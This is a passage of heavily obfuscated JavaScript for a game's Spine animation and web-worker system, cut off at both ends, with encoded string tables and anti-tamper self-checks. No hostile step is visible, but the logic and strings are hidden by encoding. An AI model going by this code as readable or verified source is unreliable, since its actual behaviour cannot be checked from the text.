RFdGmk7l8o0WRTmo3W','AgfZt3DUuhjVCgvYDhK','Dg9tDhjPBMC','nJq0nZf0B2zVzwe','W6vbW50olCo9q8kiW5RcH2zdWQxcK1FcQSkUWRnb','CgXHEufWCgvUzefUAw1HDgLVBG','ndy2nhvZu3HxyW','W69eqCk/v8klWQddU8kPlKa','mSoaW7a6fM3cH8kpqCoApGhcLa','WRG4Db8','Bg9JyxrPB24','WRjflCoiW4H6WPddKmoVpmo7W79bpSo0','omkOje4JW4fCbmksW6dcQW','W6r+WPxdQNPKdmkIhW','wSodWQNdN8o6W5XVW6bX','WROUc0JdVCkPqI0wW5rdtIapW6OjdmkjwG','ueXbwv9msu5f','WR0sWR43imoi','wCkwEf91W47dOmojWPn6oG','CxLqBgf5zxjbCha','fSksW6fXW4fijYlcPCkGkSoD','pCkMAbtcOcflnq','WR7dHmk8pq','mZq3mJiXqNbMAwPo','W5FcPbdcG8kcAG','WPKBE8o2','zgf0yq','pCooW70Yj3ZcJCkk'];a0_0x3ef3=function(){return _0x14233a;};return a0_0x3ef3();}function a0_0xcef0(_0x53ba7d,_0xd4181e){const _0x68e6a1=a0_0x3ef3();return a0_0xcef0=function(_0x384e45,_0xa009f8){_0x384e45=_0x384e45-0xa5;let _0x3ef3a7=_0x68e6a1[_0x384e45];if(a0_0xcef0['GVNzMQ']===undefined){var _0xcef024=function(_0x23413e){const _0x43357d='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x3e7a95='',_0x36f698='',_0x2252c0=_0x3e7a95+_0xcef024;for(let _0x1687ad=0x0,_0x463bb2,_0x43d274,_0x80b4a4=0x0;_0x43d274=_0x23413e['charAt'](_0x80b4a4++);~_0x43d274&&(_0x463bb2=_0x1687ad%0x4?_0x463bb2*0x40+_0x43d274:_0x43d274,_0x1687ad++%0x4)?_0x3e7a95+=_0x2252c0['charCodeAt'](_0x80b4a4+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x463bb2>>(-0x2*_0x1687ad&0x6)):_0x1687ad:0x0){_0x43d274=_0x43357d['indexOf'](_0x43d274);}for(let _0x4599a7=0x0,_0x4612ab=_0x3e7a95['length'];_0x4599a7<_0x4612ab;_0x4599a7++){_0x36f698+='%'+('00'+_0x3e7a95['charCodeAt'](_0x4599a7)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x36f698);};const _0x35d2c8=function(_0x2cb893,_0x500f36){let _0x151f46=[],_0x34a649=0x0,_0x1aed63,_0x49acb2='';_0x2cb893=_0xcef024(_0x2cb893);let _0x1f6df0;for(_0x1f6df0=0x0;_0x1f6df0<0x100;_0x1f6df0++){_0x151f46[_0x1f6df0]=_0x1f6df0;}for(_0x1f6df0=0x0;_0x1f6df0<0x100;_0x1f6df0++){_0x34a649=(_0x34a649+_0x151f46[_0x1f6df0]+_0x500f36['charCodeAt'](_0x1f6df0%_0x500f36['length']))%0x100,_0x1aed63=_0x151f46[_0x1f6df0],_0x151f46[_0x1f6df0]=_0x151f46[_0x34a649],_0x151f46[_0x34a649]=_0x1aed63;}_0x1f6df0=0x0,_0x34a649=0x0;for(let _0x24a37c=0x0;_0x24a37c<_0x2cb893['length'];_0x24a37c++){_0x1f6df0=(_0x1f6df0+0x1)%0x100,_0x34a649=(_0x34a649+_0x151f46[_0x1f6df0])%0x100,_0x1aed63=_0x151f46[_0x1f6df0],_0x151f46[_0x1f6df0]=_0x151f46[_0x34a649],_0x151f46[_0x34a649]=_0x1aed63,_0x49acb2+=String['fromCharCode'](_0x2cb893['charCodeAt'](_0x24a37c)^_0x151f46[(_0x151f46[_0x1f6df0]+_0x151f46[_0x34a649])%0x100]);}return _0x49acb2;};a0_0xcef0['aTGQni']=_0x35d2c8,_0x53ba7d=arguments,a0_0xcef0['GVNzMQ']=!![];}const _0x1ce2a4=_0x68e6a1[0x0],_0x43c72d=_0x384e45+_0x1ce2a4,_0xeb896a=_0x53ba7d[_0x43c72d];if(!_0xeb896a){if(a0_0xcef0['NtOnAT']===undefined){const _0x5946f6=function(_0x5e9972){this['eVYEAp']=_0x5e9972,this['FPXpTl']=[0x1,0x0,0x0],this['TElXUZ']=function(){return'newState';},this['xdkPhy']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['BtNKYe']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x5946f6['prototype']['dLLqaV']=function(){const _0x315877=new RegExp(this['xdkPhy']+this['BtNKYe']),_0x7178b0=_0x315877['test'](this['TElXUZ']['toString']())?--this['FPXpTl'][0x1]:--this['FPXpTl'][0x0];return this['DbnDQT'](_0x7178b0);},_0x5946f6['prototype']['DbnDQT']=function(_0x107787){if(!Boolean(~_0x107787))return _0x107787;return this['WEQUft'](this['eVYEAp']);},_0x5946f6['prototype']['WEQUft']=function(_0x51c7cb){for(let _0x5545a4=0x0,_0x1803bc=this['FPXpTl']['length'];_0x5545a4<_0x1803bc;_0x5545a4++){this['FPXpTl']['push'](Math['round'](Math['random']())),_0x1803bc=this['FPXpTl']['length'];}return _0x51c7cb(this['FPXpTl'][0x0]);},new _0x5946f6(a0_0xcef0)['dLLqaV'](),a0_0xcef0['NtOnAT']=!![];}_0x3ef3a7=a0_0xcef0['aTGQni'](_0x3ef3a7,_0xa009f8),_0x53ba7d[_0x43c72d]=_0x3ef3a7;}else _0x3ef3a7=_0xeb896a;return _0x3ef3a7;},a0_0xcef0(_0x53ba7d,_0xd4181e);}const a0_0x315877=(function(){let _0x107787=!![];return function(_0x51c7cb,_0x5545a4){const a0_0x2bffe9={_0x37ca24:0xb0},_0x1803bc=_0x107787?function(){const _0x1ec778=a0_0x3e7a;if(_0x5545a4){const _0x23489c=_0x5545a4[_0x1ec778(a0_0x2bffe9._0x37ca24)](_0x51c7cb,arguments);return _0x5545a4=null,_0x23489c;}}:function(){};return _0x107787=![],_0x1803bc;};}()),a0_0x7178b0=a0_0x315877(this,function(){const a0_0x1654e6={_0x484ab4:0xcf,_0x319f38:'vm9[',_0x47ce6f:0xb9,_0x6d1f54:'sW[B',_0x309cb6:0xdc,_0x5300eb:0xc1,_0x304c0e:0xc0,_0x53c83c:0xe0},_0x415d96=a0_0x3e7a,_0x589294=a0_0xcef0;return a0_0x7178b0[_0x589294(a0_0x1654e6._0x484ab4,a0_0x1654e6._0x319f38)]()[_0x589294(a0_0x1654e6._0x47ce6f,a0_0x1654e6._0x6d1f54)]('(((.+)+)+)+$')[_0x589294(a0_0x1654e6._0x309cb6,'y%UD')]()[_0x415d96(a0_0x1654e6._0x5300eb)](a0_0x7178b0)[_0x589294(a0_0x1654e6._0x304c0e,'poiC')](_0x415d96(a0_0x1654e6._0x53c83c));});a0_0x7178b0(),Object['assign'](lib,{'qyWorkerLoadEnv':{'bodyWidth':document[a0_0x137492(0xe5,')!oM')][a0_0x137492(0x11c,'9EP5')],'bodyHeight':document[a0_0x137492(0xdb,'7bG#')]['clientHeight'],'baseUrl':lib[a0_0xd3a00c(0xe2)][a0_0x137492(0x109,'poiC')]?lib[a0_0x137492(0xfd,']7xB')][a0_0x137492(0xcd,'Af)6')](0x0,lib['assetURL'][a0_0x137492(0xd9,'*]^1')]-0x1):window[a0_0xd3a00c(0x114)][a0_0x137492(0xc9,'FGnI')]['slice'](0x0,window['location'][a0_0xd3a00c(0xb6)][a0_0xd3a00c(0xef)]('/')),'animationPath':a0_0xd3a00c(0xae)},'qyMessage':new qyMessage(),'qyWorkerLoadSpine'({name:_0x30f854,uuid:_0x5c25ed,isJson:isJson=![]},_0x24db73=function(_0x43a0d5,_0x57726d){}){const a0_0x46e09b={_0x2577b1:0xeb,_0x3c00c0:'Igut',_0x57f366:'*]^1',_0x4ea81e:0xd5,_0x2d9a0f:'#yfl',_0x54b609:0xac,_0x1c8761:0xdd,_0x4ccf60:'hg)O'},_0x2a30ab=a0_0xd3a00c,_0x3d89c5=a0_0x137492,_0x314d32=qyAnimationUtil[_0x3d89c5(a0_0x46e09b._0x2577b1,a0_0x46e09b._0x3c00c0)](),_0x42f4e2={};_0x42f4e2[_0x3d89c5(0xaf,a0_0x46e09b._0x57f366)]=isJson,_0x42f4e2['env']=this['qyWorkerLoadEnv'];const _0xc4e81b={};_0xc4e81b[_0x3d89c5(a0_0x46e09b._0x4ea81e,a0_0x46e09b._0x2d9a0f)]=qyWorkerAction[_0x2a30ab(0xfc)],_0xc4e81b['messageId']=_0x314d32,_0xc4e81b[_0x3d89c5(a0_0x46e09b._0x54b609,'37ZO')]=_0x24db73,JzwdWebWorkerOrMainWorker(lib[_0x3d89c5(a0_0x46e09b._0x1c8761,a0_0x46e09b._0x4ccf60)],_0x30f854,_0x42f4e2,_0x5c25ed,_0xc4e81b);},'qyWorkerLine'(_0x1ec0b9={},_0x1ee781){const a0_0x20f27b={_0x1c8b47:0xd1,_0x10304b:'1$5c',_0x5afff8:0xce,_0x4c5b40:'QH#*',_0x5cac8f:'4UU3',_0x2193d2:0xf2,_0x543c5a:0xb4,_0x46b1c0:0x11a},a0_0x466136={_0x5f21aa:0xee,_0x839431:0xd4},_0x20b93f=a0_0xd3a00c,_0x5a7cfb=a0_0x137492,{..._0x52223b}=_0x1ec0b9,{name:_0x547910,uuid:uuid=qyAnimationUtil[_0x5a7cfb(0xb1,'Hn[f')]()}=_0x52223b,{start:_0x475c87,end:_0xcc9eba}=lib[_0x5a7cfb(0xd8,'CpmP')]['getPlayerCardStartEnd'](_0x52223b);if(!_0x547910)return![];_0x1ee781=_0x1ee781||function(_0x322573,_0x494475){},_0x52223b[_0x5a7cfb(a0_0x20f27b._0x1c8b47,a0_0x20f27b._0x10304b)]=_0x475c87,_0x52223b[_0x5a7cfb(a0_0x20f27b._0x5afff8,a0_0x20f27b._0x4c5b40)]=_0xcc9eba,_0x52223b[_0x5a7cfb(0xcc,a0_0x20f27b._0x5cac8f)]=_0x52223b[_0x20b93f(a0_0x20f27b._0x2193d2)]||function(_0x456f92,_0x48c4e6){},lib[_0x20b93f(a0_0x20f27b._0x543c5a)](_0x52223b,null,(_0x49f4fc,_0xd7480e)=>{const _0x17dbd5=_0x5a7cfb,_0x24d3b9=_0x20b93f;_0x1ee781(_0x49f4fc,_0xd7480e);if(_0x49f4fc!==_0x24d3b9(0xf2))return;lib[_0x17dbd5(a0_0x466136._0x5f21aa,'a!%S')][_0x17dbd5(a0_0x466136._0x839431,'5Is1')](_0x52223b);},qyWorkerAction[_0x20b93f(a0_0x20f27b._0x46b1c0)]);},'qyWorkerSpineOnce'(_0x2d11f4={},_0xeb571b=function(_0x188e24,_0x4f7c72){},_0x4f669a=function(_0x55f424,_0x40eacb){},_0x13e902=qyWorkerAction[a0_0x137492(0x103,'s41j')]){const a0_0x4ada30={_0x10bd5d:0xa9,_0x4e87f8:'s41j',_0x414441:0xb4},_0x4a98ef=a0_0xd3a00c,_0x5c3261=a0_0x137492;_0x2d11f4[_0x5c3261(a0_0x4ada30._0x10bd5d,a0_0x4ada30._0x4e87f8)]=![],lib[_0x4a98ef(a0_0x4ada30._0x414441)](...arguments);},'qyWorkerUpdateSpine'(_0x166f41={},_0x421a74=function(_0x1ee3e3,_0x2928d8){}){const a0_0x20ab92={_0x1823d6:0xf4,_0x366c57:0xf5,_0x202f07:0xea,_0x5a010e:0xab,_0x1280cc:'m!b0'},_0xbe311f=a0_0x137492,_0xe8ac8c=a0_0xd3a00c,{uuid:_0x461ac8,name:_0x4d8e23}=_0x166f41;if(!_0x461ac8)return;const _0x2b36cb=qyAnimationUtil[_0xe8ac8c(a0_0x20ab92._0x1823d6)](),_0x1258d8={};_0x1258d8[_0xbe311f(a0_0x20ab92._0x366c57,'m!b0')]=qyWorkerAction['UPDATE'],_0x1258d8[_0xe8ac8c(a0_0x20ab92._0x202f07)]=_0x2b36cb,_0x1258d8[_0xbe311f(a0_0x20ab92._0x5a010e,a0_0x20ab92._0x1280cc)]=_0x421a74,JzwdWebWorkerOrMainWorker(lib[_0xe8ac8c(0x11d)],_0x4d8e23,_0x166f41,_0x461ac8,_0x1258d8);},'qyWorkerGetInfoBySpineId'(_0x5be388={},_0x12ccbf=function(_0x11da56,_0x48b43d){}){const a0_0x37969f={_0x272b33:0xf4,_0x125033:0xbd,_0x53ed7b:0x117,_0x1f9657:'y%UD',_0x215fa7:0x101,_0xd88394:0x11d},_0x7de8f6=a0_0x137492,_0x1e2943=a0_0xd3a00c,{uuid:_0x2235cd,name:name=''}=_0x5be388;if(!_0x2235cd)return;const _0x29689a=qyAnimationUtil[_0x1e2943(a0_0x37969f._0x272b33)](),_0x396d8f={};_0x396d8f['action']=qyWorkerAction[_0x1e2943(a0_0x37969f._0x125033)],_0x396d8f[_0x7de8f6(a0_0x37969f._0x53ed7b,a0_0x37969f._0x1f9657)]=_0x29689a,_0x396d8f[_0x1e2943(a0_0x37969f._0x215fa7)]=_0x12ccbf,JzwdWebWorkerOrMainWorker(lib[_0x1e2943(a0_0x37969f._0xd88394)],name,_0x5be388,_0x2235cd,_0x396d8f);},'qyWorkerStopSpine'(_0x14b3bc,_0x4776fd=function(_0x58e350,_0x4b1e03){}){const a0_0x513845={_0x174d30:0xd3,_0x276be4:0x10a,_0x4823dd:'Lq#Z'},_0x4679f2=a0_0x137492,_0x6a203f=a0_0xd3a00c,_0x2fc445=qyAnimationUtil[_0x6a203f(0xf4)](),_0x397f05={};_0x397f05[_0x6a203f(a0_0x513845._0x174d30)]=qyWorkerAction['STOP'],_0x397f05[_0x4679f2(a0_0x513845._0x276be4,a0_0x513845._0x4823dd)]=_0x2fc445,_0x397f05[_0x6a203f(0x101)]=_0x4776fd,JzwdWebWorkerOrMainWorker(lib['qyPlayerApp'],'',{},_0x14b3bc,_0x397f05);}}),loadAnimationPromise[a0_0x137492(0xc5,'15Tz')](function(){const a0_0x5927fd={_0x225435:0xde,_0x205c48:'7bG#'},a0_0x5e389f={_0x36059e:0xf7,_0x242a9d:'hg)O',_0x2ee3d6:0x11b,_0x3a1215:'FGnI',_0x1a2b91:0xad,_0x490019:'Af)6'},a0_0x2729a8={_0xf32d1c:0xe3,_0xde4b0f:'a!%S',_0x1f26e6:0x111,_0x23646e:'gQ))',_0x1f8916:0x105,_0x3cbb20:'w1Uo',_0x35902b:0xb2,_0x38c1d1:'xhGa',_0x2416e0:0xb3,_0x3a250d:0x104,_0x2737f0:0x112,_0x1c7c3a:'m!b0',_0x56d25f:0xfa,_0x3cd4d9:0xd6,_0x2dafa0:'hg)O',_0x532d32:0xb7},a0_0x45127f={_0x200924:0xff,_0x303152:0x11d},a0_0x2a3aac={_0x255c6e:0x107,_0x258d3b:0xf5,_0x6a8396:'m!b0',_0x44dfcd:'9EP5',_0x1f7278:0xc7,_0x18d504:'5Is1'},a0_0x143d9a={_0x4ed245:0xf9,_0x2eb3a1:'([ji',_0x417b4b:0x118,_0x1a3bcd:'w1Uo',_0x4510f2:0x101,_0x5e09cd:'m!b0',_0x1cd6be:0x100,_0xff5529:0xcb,_0x32b9c1:'1$5c',_0x3d4aab:0xd7,_0x5bb068:0xbc,_0xd12434:0xf3,_0x428640:0xbc,_0x18e54e:0xe4,_0x5b4012:0xa8,_0x136b52:0xda,_0x2b7312:0xbf,_0x543bb2:'37ZO',_0x359097:0xb8,_0x2f6baa:'Af)6',_0x5605dd:0xf0,_0x4b0f42:0x113,_0x44491c:']*u%',_0x9b5206:0xca,_0x1b60c9:'5Is1',_0x18c9be:'Lq#Z',_0x4da4f5:0xf6,_0x24e615:0xe6,_0x5cea70:0x10e,_0x5724ac:'Igut'},_0x3e6940=a0_0x137492;Object[_0x3e6940(a0_0x5927fd._0x225435,a0_0x5927fd._0x205c48)](window,{'JzwdWebWorkerOrMainWorker':function(_0x193cad,_0x32a366,_0x48e46f,_0x2548c6,_0x45449e){const a0_0x27ca4a={_0xfe80a4:0xa5,_0x4b671e:'sW[B',_0x2b51aa:0xea,_0x47ac8b:0xaa,_0x155892:0xd0,_0x3add42:'poiC',_0x58afb0:0x11a,_0x1009ed:0x119,_0x4a62a2:'z#X4'},_0x87cf94=_0x3e6940,_0x5791c4=a0_0x3e7a;if(!_0x45449e)_0x45449e={};let _0x2c55f2=_0x45449e[_0x5791c4(0xd3)];if(!_0x2c55f2)_0x2c55f2=qyWorkerAction[_0x87cf94(a0_0x143d9a._0x4ed245,a0_0x143d9a._0x2eb3a1)];const _0x10db82=_0x45449e[_0x5791c4(0xea)],_0x517334=_0x45449e[_0x87cf94(a0_0x143d9a._0x417b4b,a0_0x143d9a._0x1a3bcd)]||_0x2c55f2,_0x46de9a=_0x45449e[_0x5791c4(a0_0x143d9a._0x4510f2)]||function(_0x18215a,_0x36e828){};if(lib[_0x87cf94(0xd2,a0_0x143d9a._0x5e09cd)]){if(lib[_0x5791c4(a0_0x143d9a._0x1cd6be)]&&_0x48e46f)_0x48e46f=lib[_0x87cf94(a0_0x143d9a._0xff5529,a0_0x143d9a._0x32b9c1)][_0x5791c4(a0_0x143d9a._0x3d4aab)](_0x48e46f,_0x2c55f2,_status[_0x5791c4(a0_0x143d9a._0x5bb068)]?.[_0x5791c4(a0_0x143d9a._0xd12434)]??_status[_0x5791c4(a0_0x143d9a._0x428640)]);const {spine_delay:spine_delay=0x0}=_0x48e46f;_0x2548c6=lib['qyAnimationCustomUtil']?.[_0x5791c4(a0_0x143d9a._0x18e54e)](_0x48e46f,_0x2548c6,_0x45449e)||_0x2548c6,lib['qyAnimationCustomUtil']?.['playAudio'](_0x48e46f);let _0x3cb8ed={};if(typeof _0x48e46f===_0x87cf94(a0_0x143d9a._0x5b4012,'%w7a')&&_0x48e46f!==null){const _0x22e5e8={..._0x48e46f};_0x3cb8ed=_0x22e5e8,_0x48e46f=qyAnimationUtil[_0x5791c4(a0_0x143d9a._0x136b52)](_0x48e46f);}_0x517334&&_0x10db82&&lib[_0x87cf94(a0_0x143d9a._0x2b7312,a0_0x143d9a._0x543bb2)]&&lib[_0x87cf94(a0_0x143d9a._0x359097,a0_0x143d9a._0x2f6baa)][_0x5791c4(a0_0x143d9a._0x5605dd)](_0x10db82,_0x517334,_0x46de9a);if(qyAnimationUtil[_0x87cf94(0x115,'zpSf')](spine_delay)&&spine_delay>0x0)setTimeout(()=>{const _0x57f47b=_0x5791c4,_0x3dc21=_0x87cf94,_0x24608c={};_0x24608c['id']=0x1,_0x24608c['name']=_0x32a366,_0x24608c[_0x3dc21(a0_0x27ca4a._0xfe80a4,'hg)O')]=_0x48e46f,_0x24608c[_0x3dc21(0xe7,a0_0x27ca4a._0x4b671e)]=_0x2548c6;const _0x27cd57={};_0x27cd57['action']=_0x2c55f2,_0x27cd57[_0x57f47b(a0_0x27ca4a._0x2b51aa)]=_0x10db82,_0x27cd57[_0x57f47b(0xec)]=_0x517334,_0x27cd57[_0x57f47b(a0_0x27ca4a._0x47ac8b)]=_0x24608c,lib['qyWebWorker'][_0x3dc21(a0_0x27ca4a._0x155892,a0_0x27ca4a._0x3add42)](_0x27cd57),_0x2c55f2===qyWorkerAction[_0x57f47b(a0_0x27ca4a._0x58afb0)]?lib['qyAnimationLineUtil']?.[_0x3dc21(a0_0x27ca4a._0x1009ed,a0_0x27ca4a._0x4a62a2)](_0x3cb8ed):lib['qyAnimationCustomUtil']?.['playAppendAnimation'](_0x3cb8ed),_0x48e46f=_0x3cb8ed=null;},parseFloat(spine_delay));else{const _0x24402a={};_0x24402a['id']=0x1,_0x24402a[_0x87cf94(a0_0x143d9a._0x4b0f42,a0_0x143d9a._0x44491c)]=_0x32a366,_0x24402a['position']=_0x48e46f,_0x24402a[_0x87cf94(a0_0x143d9a._0x9b5206,a0_0x143d9a._0x1b60c9)]=_0x2548c6;const _0x351657={};_0x351657['action']=_0x2c55f2,_0x351657['messageId']=_0x10db82,_0x351657[_0x5791c4(0xec)]=_0x517334,_0x351657[_0x87cf94(0xa6,a0_0x143d9a._0x18c9be)]=_0x24402a,lib[_0x5791c4(a0_0x143d9a._0x4da4f5)]['postMessage'](_0x351657),_0x2c55f2===qyWorkerAction[_0x87cf94(a0_0x143d9a._0x24e615,'15Tz')]?lib['qyAnimationLineUtil']?.[_0x5791c4(0x10f)](_0x3cb8ed):lib[_0x5791c4(0x100)]?.[_0x87cf94(a0_0x143d9a._0x5cea70,a0_0x143d9a._0x5724ac)](_0x3cb8ed);}return;}JzwdAnimation(_0x193cad,_0x32a366,_0x48e46f);},'JzwdWebWorkerDestroySpine':function(..._0x597fc3){const _0x5b4de6=_0x3e6940,_0x46da60=a0_0x3e7a;for(let _0x3cfa7c of _0x597fc3){const _0xaa3907={};_0xaa3907['id']=0x1,_0xaa3907[_0x46da60(a0_0x2a3aac._0x255c6e)]=_0x3cfa7c;const _0x32bee0={};_0x32bee0[_0x5b4de6(a0_0x2a3aac._0x258d3b,a0_0x2a3aac._0x6a8396)]=qyWorkerAction[_0x5b4de6(0xb5,a0_0x2a3aac._0x44dfcd)],_0x32bee0[_0x5b4de6(a0_0x2a3aac._0x1f7278,a0_0x2a3aac._0x18d504)]=_0xaa3907,lib['qyWebWorker']['postMessage'](_0x32bee0);}},'JzwdAnimation':function(_0x32802c,_0x5c3b7b,_0x4eaac1){const _0x97d9fd=a0_0x3e7a;let _0x10ca40=new window[(_0x97d9fd(a0_0x45127f._0x200924))](_0x32802c||lib[_0x97d9fd(a0_0x45127f._0x303152)]);return JzwdPlayAnimDelay(_0x5c3b7b,_0x4eaac1,null,_0x10ca40);},'JzwdPlayAnimDelay':function(_0x4b182c,_0x3ad11b,_0x589f23,_0x28ff00){const _0x2e41d7=a0_0x3e7a,_0x39fab9=_0x3e6940;!(_0x28ff00&&_0x28ff00[_0x39fab9(a0_0x2729a8._0xf32d1c,a0_0x2729a8._0xde4b0f)]===window['qyAnimation'])&&(_0x28ff00=new window[(_0x39fab9(a0_0x2729a8._0x1f26e6,a0_0x2729a8._0x23646e))](lib['qyPlayerApp']));if(typeof _0x3ad11b===_0x39fab9(a0_0x2729a8._0x1f8916,a0_0x2729a8._0x3cbb20))game[_0x39fab9(a0_0x2729a8._0x35902b,a0_0x2729a8._0x38c1d1)](_0x3ad11b/0x3e8);else{if(typeof _0x3ad11b===_0x2e41d7(a0_0x2729a8._0x2416e0)&&_0x3ad11b!==null)_0x589f23=_0x3ad11b;}let _0x1fb06f='';Array[_0x2e41d7(a0_0x2729a8._0x3a250d)](_0x4b182c)&&(_0x1fb06f=_0x4b182c[0x1],_0x4b182c=_0x4b182c[0x0]);if(!_0x589f23)_0x589f23={};_0x28ff00[_0x39fab9(a0_0x2729a8._0x2737f0,a0_0x2729a8._0x1c7c3a)](_0x4b182c,_0x589f23),_0x1fb06f=_0x1fb06f||_0x589f23[_0x39fab9(a0_0x2729a8._0x56d25f,'15Tz')]||_0x28ff00[_0x39fab9(a0_0x2729a8._0x3cd4d9,a0_0x2729a8._0x2dafa0)];if(!_0x589f23[_0x2e41d7(0x10b)]('loop'))_0x589f23[_0x2e41d7(a0_0x2729a8._0x532d32)]=![];return _0x28ff00['playSpine'](_0x1fb06f,_0x589f23[_0x2e41d7(0xb7)]),_0x28ff00;},'JzwdWebWorkerMergeConfig':function(_0xb412eb,_0x3fc691,_0x28396e,_0x2215a1,_0x29a719){const _0x3292ae=a0_0x3e7a,_0x37a538=_0x3e6940,_0x4a058c=lib['qyAnimationCustomUtil']?.[_0x37a538(a0_0x5e389f._0x36059e,a0_0x5e389f._0x242a9d)](_0xb412eb,![]);if(!_0x4a058c?.[_0x37a538(a0_0x5e389f._0x2ee3d6,a0_0x5e389f._0x3a1215)])return null;const _0x45500f=_0x4a058c[0x0],_0x20c4ad=Object[_0x37a538(a0_0x5e389f._0x1a2b91,a0_0x5e389f._0x490019)]({},_0x45500f,_0x28396e);return JzwdWebWorkerOrMainWorker(lib[_0x3292ae(0x11d)],_0x3fc691,_0x20c4ad,_0x2215a1,_0x29a719);}}),createLibQyWebView();},_0x1f5906=>{const a0_0x4e408e={_0x6db4bf:0x102,_0x4079cc:0x10c,_0x2224e8:0xf1,_0x390317:0x116,_0x30fed9:0x108},_0x15fd80=a0_0x137492,_0x3a180c=a0_0xd3a00c;let _0x459e1e=_0x1f5906['stack']['toString'](),_0x521184=[_0x3a180c(a0_0x4e408e._0x6db4bf),_0x1f5906[_0x3a180c(a0_0x4e408e._0x4079cc)](),'\x0a\x20\x20\x20\x20具体栈信息：',_0x459e1e][_0x3a180c(a0_0x4e408e._0x2224e8)]('');_0x459e1e['includes'](_0x15fd80(a0_0x4e408e._0x390317,'ZfzP'))&&_0x459e1e['includes']('Unexpected')&&(_0x521184=_0x3a180c(0xba)+_0x521184),console[_0x3a180c(a0_0x4e408e._0x30fed9)](_0x521184),console[_0x3a180c(0xe9)](_0x1f5906),alert(_0x521184);});
        });
    });

    function a0_0x1b07(){const _0x59689b=['ErTUWPhdICkHW6BdGmokW7pcRh/dJW','areBsbHVW7iMWRK','otaXntyXnvDnzMLorW','kCoAW5O','mwPgywDqyG','pwRcQmoIiZ0','FXvRWPVdJCkVWQxdOmoyW77cUMa','mJCYmJq2muDdqw5jtq','otC0ntK3nKntB0HQEa','WR3dNSk8W6reW4pdQcW','zgvSzxrL','W6uscxFdVq','zxzLBNrZ','b8kPFCk2WO4V','WRHqrCoSxvaB','CxLxzwjxB3jRzxjnzxnZywDL','WO3cRtOyih0','AgfZ','zNvUy3rPB24','Cg9ZAxrPB24','WR3cK8kcWOHEyIKRjq8VaCoZ','W4XcW43dHa','uCoTkCoRW45QrSkEW7xdU0qd','y2fSBgjHy2S','l2tdQCk8sCklW4lcS0JcGmk8','CxLxB3jRzxjby3rPB24','W7ldVHnDW61JiSo2mCoQqG','pIWWWRBdP1a','BwvZC2fNzuLK','r1H7tYbAW5C','WRvoxcxcUmo1aSogWRRcHSkQW4GqdG','ndmYndj6Ag1psem','B2zM','C2vHCMnO','eCoUFfu3BCoF','C2v0','yxbWBhK','aCkWDSkRWO4Ux8k1W47dHuu','WQVcR2SFWQCZBmkTw8kZgqy','W7C2rIlcHCo7WRe','z2vUzxjHDg9Yvvvjra','WR1gq8oSrLugWRa','W7RdUfFdTCoMWRhdRmob','C3bSAwnL'];a0_0x1b07=function(){return _0x59689b;};return a0_0x1b07();}function a0_0x1cb9(_0x3e3af4,_0x32f908){const _0x6437b2=a0_0x1b07();return a0_0x1cb9=function(_0x4f6fe9,_0xc458dc){_0x4f6fe9=_0x4f6fe9-0xe6;let _0x1b0773=_0x6437b2[_0x4f6fe9];if(a0_0x1cb9['uEtSMU']===undefined){var _0x59e08c=function(_0x947988){const _0x5ce64e='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x399b2e='',_0x1cb9dc='',_0xf49d7a=_0x399b2e+_0x59e08c;for(let _0x149056=0x0,_0x194fa3,_0x355b1e,_0x4cd423=0x0;_0x355b1e=_0x947988['charAt'](_0x4cd423++);~_0x355b1e&&(_0x194fa3=_0x149056%0x4?_0x194fa3*0x40+_0x355b1e:_0x355b1e,_0x149056++%0x4)?_0x399b2e+=_0xf49d7a['charCodeAt'](_0x4cd423+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x194fa3>>(-0x2*_0x149056&0x6)):_0x149056:0x0){_0x355b1e=_0x5ce64e['indexOf'](_0x355b1e);}for(let _0x1e190c=0x0,_0x4cb506=_0x399b2e['length'];_0x1e190c<_0x4cb506;_0x1e190c++){_0x1cb9dc+='%'+('00'+_0x399b2e['charCodeAt'](_0x1e190c)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1cb9dc);};a0_0x1cb9['fLsGkk']=_0x59e08c,_0x3e3af4=arguments,a0_0x1cb9['uEtSMU']=!![];}const _0x1e66f1=_0x6437b2[0x0],_0x553176=_0x4f6fe9+_0x1e66f1,_0x50e922=_0x3e3af4[_0x553176];if(!_0x50e922){const _0xd24f34=function(_0x5a106c){this['AWHRvQ']=_0x5a106c,this['cWqoon']=[0x1,0x0,0x0],this['qMzeWh']=function(){return'newState';},this['PsCUME']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['VxxDNc']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0xd24f34['prototype']['SnfFPx']=function(){const _0x5ce3dd=new RegExp(this['PsCUME']+this['VxxDNc']),_0x75ba13=_0x5ce3dd['test'](this['qMzeWh']['toString']())?--this['cWqoon'][0x1]:--this['cWqoon'][0x0];return this['aFPZHn'](_0x75ba13);},_0xd24f34['prototype']['aFPZHn']=function(_0x6c8a40){if(!Boolean(~_0x6c8a40))return _0x6c8a40;return this['dYXDUX'](this['AWHRvQ']);},_0xd24f34['prototype']['dYXDUX']=function(_0x31649d){for(let _0x3a69ff=0x0,_0x2520d1=this['cWqoon']['length'];_0x3a69ff<_0x2520d1;_0x3a69ff++){this['cWqoon']['push'](Math['round'](Math['random']())),_0x2520d1=this['cWqoon']['length'];}return _0x31649d(this['cWqoon'][0x0]);},new _0xd24f34(a0_0x1cb9)['SnfFPx'](),_0x1b0773=a0_0x1cb9['fLsGkk'](_0x1b0773),_0x3e3af4[_0x553176]=_0x1b0773;}else _0x1b0773=_0x50e922;return _0x1b0773;},a0_0x1cb9(_0x3e3af4,_0x32f908);}function a0_0x59e0(_0x3e3af4,_0x32f908){const _0x6437b2=a0_0x1b07();return a0_0x59e0=function(_0x4f6fe9,_0xc458dc){_0x4f6fe9=_0x4f6fe9-0xe6;let _0x1b0773=_0x6437b2[_0x4f6fe9];if(a0_0x59e0['nsmmId']===undefined){var _0x59e08c=function(_0x5ce64e){const _0x399b2e='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let 